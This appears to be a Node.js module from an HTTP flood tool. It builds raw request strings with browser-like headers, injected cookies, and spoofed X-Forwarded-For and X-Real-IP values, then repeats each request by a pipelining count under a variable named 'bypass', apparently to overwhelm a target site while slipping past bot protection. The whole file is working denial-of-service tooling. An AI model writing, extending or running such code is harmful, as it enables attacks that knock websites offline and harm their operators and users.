const URL = require('url');

function randomByte() {
    return Math.round(Math.random() * 256);
}

function randomIp() {
    const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

    return isPrivate(ip) ? ip : randomIp();
}

function isPrivate(ip) {
    return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}


function get_cookies(args, secondcookies){
    let cookies = "";
    if(!(args.headers['cookie'] == undefined)){
        cookies += args.headers['cookie']
        if(!(secondcookies == 'false')) cookies += ";"
    }
    if(!(secondcookies == 'false')) cookies += secondcookies;
    return cookies;
}
function generate_payload(args, useragent, secondcookies){
    let headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': 1,
        'User-Agent': useragent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Accept-Language': 'en-US,en;q=0.9'
    }
    if(!(args.headers == 'false')){
        for(x in args.headers){
            if(!(x == 'cookie' || x == 'user-agent')) headers[x] = args.headers[x];
        }
    }
    if(!(args.headers['cookie'] == undefined && secondcookies == 'false')) headers['cookie'] = get_cookies(args, secondcookies);

    headers['X-Real-IP'] = randomIp();
    headers['X-Forwarded-For'] = randomIp();
    return headers;
}

function start(args, proxy, ua, secondcookies){
    let headerz = generate_payload(args, ua, secondcookies);
    let bypass = (args.postdata == false ? 'GET' : 'POST') + " " + args.target + " HTTP/1.1\r\n";
    bypass    += `Host: ${URL.parse(args.target).hostname}\r\n`;
    for(x in headerz){
        bypass += `${x}: ${headerz[x]}\r\n`;
    }
    bypass    += `\r\n${args.postdata == false ? '': args.postdata}`
    return bypass.repeat(args.pipelining);
}

module.exports = start;